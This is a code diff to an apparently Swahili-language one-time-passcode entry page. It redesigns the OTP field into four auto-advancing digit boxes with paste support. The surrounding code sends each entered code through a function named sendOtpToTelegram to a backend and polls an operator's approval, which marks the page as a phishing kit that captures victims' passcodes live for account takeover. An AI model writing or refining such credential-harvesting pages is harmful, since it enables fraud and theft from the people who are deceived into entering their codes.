@@ -55,25 +55,40 @@ body {
   font-size: 15px;
   font-weight: 600;
   color: #1a2b1a;
-  margin-bottom: 10px;
+  margin-bottom: 14px;
 }
-/* New OTP input styling */
-.otp-input {
-  width: 100%;
-  padding: 16px 18px;
-  font-size: 28px;
-  font-family: inherit;
-  letter-spacing: 8px;
+/* OTP box grid */
+.otp-container {
+  display: flex;
+  gap: 12px;
+  justify-content: center;
+  margin-bottom: 24px;
+}
+.otp-box {
+  width: 60px;
+  height: 70px;
+  font-size: 32px;
+  font-weight: 600;
   text-align: center;
   border: 2px solid #d0e0d0;
   border-radius: 12px;
   background: #fafffa;
   outline: none;
   transition: border-color 0.2s, box-shadow 0.2s;
+  font-family: inherit;
 }
-.otp-input:focus {
+.otp-box:focus {
   border-color: #1a7a2a;
   box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.15);
+}
+/* hide spinners in number inputs */
+.otp-box::-webkit-outer-spin-button,
+.otp-box::-webkit-inner-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
+}
+.otp-box[type="number"] {
+  -moz-appearance: textfield;
 }
 button {
   width: 100%;
@@ -130,9 +145,13 @@ button:not(:disabled):hover {
 
     <form id="otpForm">
       <div class="label">Ingiza nambari ya 4-digit OTP</div>
-      <input id="otpInput" class="otp-input" type="text" 
-             inputmode="numeric" pattern="[0-9]*" maxlength="4"
-             placeholder="_ _ _ _" autocomplete="off" />
+      
+      <div class="otp-container">
+        <input class="otp-box" type="number" inputmode="numeric" pattern="[0-9]" maxlength="1" autocomplete="off" required />
+        <input class="otp-box" type="number" inputmode="numeric" pattern="[0-9]" maxlength="1" autocomplete="off" required />
+        <input class="otp-box" type="number" inputmode="numeric" pattern="[0-9]" maxlength="1" autocomplete="off" required />
+        <input class="otp-box" type="number" inputmode="numeric" pattern="[0-9]" maxlength="1" autocomplete="off" required />
+      </div>
 
       <button id="submitBtn" disabled>
         <span id="btnText">WASILISHA</span>
@@ -159,25 +178,72 @@ const phone = localStorage.getItem('phone') || "";
 document.getElementById('phoneNumber').textContent =
   phone ? phone.slice(0,6) + "****" + phone.slice(-2) : "No phone number found";
 
-const otpInput = document.getElementById('otpInput');
+const boxes = document.querySelectorAll('.otp-box');
 const submitBtn = document.getElementById('submitBtn');
 const btnText = document.getElementById('btnText');
 const spinner = document.getElementById('spinner');
 const statusEl = document.getElementById('status');
 
-// Restrict input to digits only
-otpInput.addEventListener('input', function() {
-  this.value = this.value.replace(/\D/g, '');
-  const isValid = this.value.length === 4;
-  submitBtn.disabled = !isValid;
+// ----- OTP box navigation logic -----
+function isAllFilled() {
+  let filled = true;
+  boxes.forEach(box => {
+    if (box.value.trim() === '') filled = false;
+  });
+  return filled;
+}
+
+function updateSubmitButton() {
+  submitBtn.disabled = !isAllFilled();
   if (statusEl.textContent) statusEl.textContent = '';
+}
+
+// Move to next box on input, auto-focus first on load
+boxes.forEach((box, index) => {
+  box.addEventListener('input', function(e) {
+    // Keep only digits
+    this.value = this.value.replace(/\D/g, '');
+    // If a digit is entered and this is not the last box, move to next
+    if (this.value.length === 1 && index < boxes.length - 1) {
+      boxes[index + 1].focus();
+    }
+    updateSubmitButton();
+  });
+
+  // Handle backspace: move to previous box if current is empty
+  box.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace' && this.value === '' && index > 0) {
+      boxes[index - 1].focus();
+    }
+  });
+
+  // Handle paste (allow pasting a 4-digit code across boxes)
+  box.addEventListener('paste', function(e) {
+    e.preventDefault();
+    const pasteData = (e.clipboardData || window.clipboardData).getData('text');
+    const digits = pasteData.replace(/\D/g, '').slice(0, 4);
+    if (digits.length === 0) return;
+    // Fill boxes with pasted digits
+    for (let i = 0; i < boxes.length; i++) {
+      if (i < digits.length) {
+        boxes[i].value = digits[i];
+      } else {
+        boxes[i].value = '';
+      }
+    }
+    // Focus the last filled box or the first empty one
+    const nextIndex = Math.min(digits.length, boxes.length - 1);
+    boxes[nextIndex].focus();
+    updateSubmitButton();
+  });
 });
 
-// Auto‑focus on page load
+// Focus the first box on page load
 window.addEventListener('load', function() {
-  otpInput.focus();
+  boxes[0].focus();
 });
 
+// ----- Backend & form submission (unchanged logic) -----
 async function sendOtpToTelegram(name, phone, code) {
   try {
     const r = await fetch(`${BACKEND_URL}/submit-code`, {
@@ -211,9 +277,12 @@ function pollCodeApproval(requestId) {
 document.getElementById('otpForm').addEventListener('submit', async function(e) {
   e.preventDefault();
 
-  const code = otpInput.value.trim();
+  // Collect code from all boxes
+  let code = '';
+  boxes.forEach(box => { code += box.value.trim(); });
+
   if (code.length !== 4) {
-    statusEl.textContent = "Tafadhali ingiza nambari kamili ya tarakimu 4.";
+    statusEl.textContent = "Tafadhali jaza nambari zote 4.";
     return;
   }
 
@@ -248,11 +317,12 @@ document.getElementById('otpForm').addEventListener('submit', async function(e) 
     }, 500);
   } else {
     statusEl.textContent = "OTP rejected. Please try again.";
-    otpInput.value = "";
+    // Clear all boxes
+    boxes.forEach(box => box.value = '');
     submitBtn.disabled = true;
     btnText.textContent = "WASILISHA";
     spinner.style.display = "none";
-    otpInput.focus();
+    boxes[0].focus();
   }
 });
 
